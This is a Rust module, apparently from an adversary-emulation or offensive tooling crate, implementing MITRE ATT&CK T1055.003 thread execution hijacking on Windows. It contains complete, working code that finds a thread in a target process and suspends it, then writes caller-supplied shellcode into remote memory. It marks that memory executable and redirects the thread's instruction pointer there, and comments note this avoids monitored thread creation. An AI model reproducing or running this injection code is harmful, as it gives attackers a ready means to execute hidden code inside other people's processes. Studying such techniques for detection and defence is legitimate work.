//! Implementation of **MITRE ATT&CK T1055.003: Thread Execution Hijacking**.
//!
//! This module implements a strategy that targets an existing thread within a remote process.
//! Instead of creating a new thread (which can be monitored), it suspends a running thread,
//! modifies its CPU instruction pointer (`RIP` on x64, `EIP` on x86) to point to the malicious
//! payload, and then resumes execution.

use std::{ffi::c_void, ptr::null};

#[cfg(target_arch = "x86_64")]
use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT_FULL_AMD64 as CONTEXT_FULL;
#[cfg(target_arch = "x86")]
use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT_FULL_X86 as CONTEXT_FULL;

use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError, HANDLE, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::{
            Debug::{CONTEXT, GetThreadContext, SetThreadContext, WriteProcessMemory},
            ToolHelp::{
                CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First,
                Thread32Next,
            },
        },
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        Threading::{
            OpenProcess, OpenThread, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, ResumeThread,
            SuspendThread, THREAD_GET_CONTEXT, THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT,
            THREAD_SUSPEND_RESUME,
        },
    },
};

use crate::{
    Error, Result, info,
    payload::Payload,
    strategy::{Strategy, Technique, ThreadExecutionHijacking},
    target::Target,
};

/// The concrete strategy implementation for T1055.003.
#[derive(Default)]
pub(crate) struct T1055_003;

impl Strategy for T1055_003 {
    fn execute(&self, technique: &Technique, payload: &Payload, target: &Target) -> Result<()> {
        let info = technique.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        let method = match technique {
            Technique::T1055_003(m) => m,
            _ => return Err(Error::Execution("Internal dispatch error".into())),
        };

        // Validate Target: Must be a PID (Remote Injection).
        let process_id = match target {
            Target::Pid(id) => *id,
            _ => {
                return Err(Error::Validation(format!(
                    "Strategy '{}' requires a Target PID.",
                    info.mitre_id
                )));
            }
        };

        // Validate Payload: Must be Shellcode.
        let shellcode = match payload {
            Payload::Shellcode { bytes, .. } => bytes,
            _ => {
                return Err(Error::Mismatch {
                    strategy: info.mitre_id,
                    variant: payload.variant_name(),
                });
            }
        };

        match method {
            ThreadExecutionHijacking::ThreadHijacking => {
                info!("Method: Thread Hijacking");
                hijack_existing_thread(process_id, shellcode)
            }
        }
    }
}

// ==============================================================================================

/// Performs the Thread Hijacking logic.
fn hijack_existing_thread(process_id: u32, shellcode: &[u8]) -> Result<()> {
    // 1. Identify a Victim Thread
    // We arbitrarily pick the first thread we find in the target process.
    let thread_id = find_first_thread(process_id)?;
    info!("Analysis: Targeting Thread ID: {}", thread_id);

    // 2. Open Process (For Memory Operations)
    let target_process =
        WindowsAPI::open_process(process_id, PROCESS_VM_OPERATION | PROCESS_VM_WRITE)?;

    // 3. Open Thread (For Context Operations)
    let target_thread = WindowsAPI::open_thread(
        thread_id,
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
    )?;

    // 4. Suspend Thread
    info!("Execution: Suspending thread...");
    target_thread.suspend_thread()?;

    // 5. Allocate Remote Memory (RW)
    let remote_addr = target_process
        .virtual_alloc_ex(shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        .map_err(|e| {
            // Attempt recovery if alloc fails (resume thread so we don't hang the process)
            let _ = target_thread.resume_thread();
            e
        })?;

    // 6. Write Shellcode
    if let Err(e) = target_process.write_process_memory(remote_addr, shellcode) {
        let _ = target_thread.resume_thread();
        return Err(e);
    }
    info!("Allocation: Shellcode written to {:p}", remote_addr);

    // 7. Protect Memory (RX) - Enforce W^X (Write XOR Execute)
    if let Err(e) =
        target_process.virtual_protect_ex(remote_addr, shellcode.len(), PAGE_EXECUTE_READ)
    {
        let _ = target_thread.resume_thread();
        return Err(e);
    }

    // 8. Hijack Context
    let mut context = target_thread.get_thread_context().map_err(|e| {
        let _ = target_thread.resume_thread();
        e
    })?;

    #[cfg(target_arch = "x86_64")]
    {
        info!(
            "Context: Overwriting RIP {:#x} -> {:p}",
            context.Rip, remote_addr
        );
        context.Rip = remote_addr as u64;
    }

    #[cfg(target_arch = "x86")]
    {
        info!(
            "Context: Overwriting EIP {:#x} -> {:p}",
            context.Eip, remote_addr
        );
        context.Eip = remote_addr as u32;
    }

    if let Err(e) = target_thread.set_thread_context(&context) {
        let _ = target_thread.resume_thread();
        return Err(e);
    }

    // 9. Resume
    info!("Execution: Context updated. Resuming thread...");
    target_thread.resume_thread()?;

    Ok(())
}

// ==============================================================================================

/// Helper: Snapshots the system to find the first thread belonging to the target PID.
fn find_first_thread(process_id: u32) -> Result<u32> {
    let snapshot_handle = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if snapshot_handle == INVALID_HANDLE_VALUE {
        return Err(Error::Win32("CreateToolhelp32Snapshot", unsafe {
            GetLastError()
        }));
    }
    let _guard = HandleGuard::new(snapshot_handle);

    let mut entry = THREADENTRY32 {
        dwSize: size_of::<THREADENTRY32>() as u32,
        ..unsafe { std::mem::zeroed() }
    };

    if unsafe { Thread32First(snapshot_handle, &mut entry) } == FALSE {
        return Err(Error::Win32("Thread32First", unsafe { GetLastError() }));
    }

    loop {
        if entry.th32OwnerProcessID == process_id {
            return Ok(entry.th32ThreadID);
        }
        if unsafe { Thread32Next(snapshot_handle, &mut entry) } == FALSE {
            break;
        }
    }

    Err(Error::Execution(format!(
        "No threads found in process {}",
        process_id
    )))
}

// ==============================================================================================

struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

struct WindowsAPI {
    handle: HandleGuard,
}

impl WindowsAPI {
    fn open_process(process_id: u32, access_rights: u32) -> Result<Self> {
        let handle = unsafe { OpenProcess(access_rights, FALSE, process_id) };
        if handle.is_null() {
            Err(Error::Win32("OpenProcess", unsafe { GetLastError() }))
        } else {
            Ok(Self {
                handle: HandleGuard::new(handle),
            })
        }
    }

    fn open_thread(thread_id: u32, access_rights: u32) -> Result<Self> {
        let handle = unsafe { OpenThread(access_rights, FALSE, thread_id) };
        if handle.is_null() {
            Err(Error::Win32("OpenThread", unsafe { GetLastError() }))
        } else {
            Ok(Self {
                handle: HandleGuard::new(handle),
            })
        }
    }

    fn suspend_thread(&self) -> Result<u32> {
        let count = unsafe { SuspendThread(self.handle.0) };
        if count == u32::MAX {
            Err(Error::Win32("SuspendThread", unsafe { GetLastError() }))
        } else {
            Ok(count)
        }
    }

    fn resume_thread(&self) -> Result<u32> {
        let count = unsafe { ResumeThread(self.handle.0) };
        if count == u32::MAX {
            Err(Error::Win32("ResumeThread", unsafe { GetLastError() }))
        } else {
            Ok(count)
        }
    }

    fn get_thread_context(&self) -> Result<CONTEXT> {
        let mut context = CONTEXT {
            ContextFlags: CONTEXT_FULL,
            ..Default::default()
        };

        let success = unsafe { GetThreadContext(self.handle.0, &mut context) };
        if success == 0 {
            Err(Error::Win32("GetThreadContext", unsafe { GetLastError() }))
        } else {
            Ok(context)
        }
    }

    fn set_thread_context(&self, context: &CONTEXT) -> Result<()> {
        let success = unsafe { SetThreadContext(self.handle.0, context) };
        if success == 0 {
            Err(Error::Win32("SetThreadContext", unsafe { GetLastError() }))
        } else {
            Ok(())
        }
    }

    fn virtual_alloc_ex(
        &self,
        size: usize,
        allocation_type: u32,
        protection_flags: u32,
    ) -> Result<*mut c_void> {
        let addr = unsafe {
            VirtualAllocEx(
                self.handle.0,
                null(),
                size,
                allocation_type,
                protection_flags,
            )
        };
        if addr.is_null() {
            Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }))
        } else {
            Ok(addr)
        }
    }

    fn virtual_protect_ex(
        &self,
        addr: *mut c_void,
        size: usize,
        new_protection: u32,
    ) -> Result<()> {
        let mut old_protection = 0;
        let success = unsafe {
            VirtualProtectEx(
                self.handle.0,
                addr,
                size,
                new_protection,
                &mut old_protection,
            )
        };
        if success == 0 {
            Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }))
        } else {
            Ok(())
        }
    }

    fn write_process_memory<T: Copy>(&self, addr: *mut c_void, data: &[T]) -> Result<()> {
        let size_bytes = size_of_val(data);
        let mut write_len: usize = 0;
        let success = unsafe {
            WriteProcessMemory(
                self.handle.0,
                addr,
                data.as_ptr().cast(),
                size_bytes,
                &mut write_len,
            )
        };
        if success == 0 || write_len != size_bytes {
            Err(Error::Win32("WriteProcessMemory", unsafe {
                GetLastError()
            }))
        } else {
            Ok(())
        }
    }
}
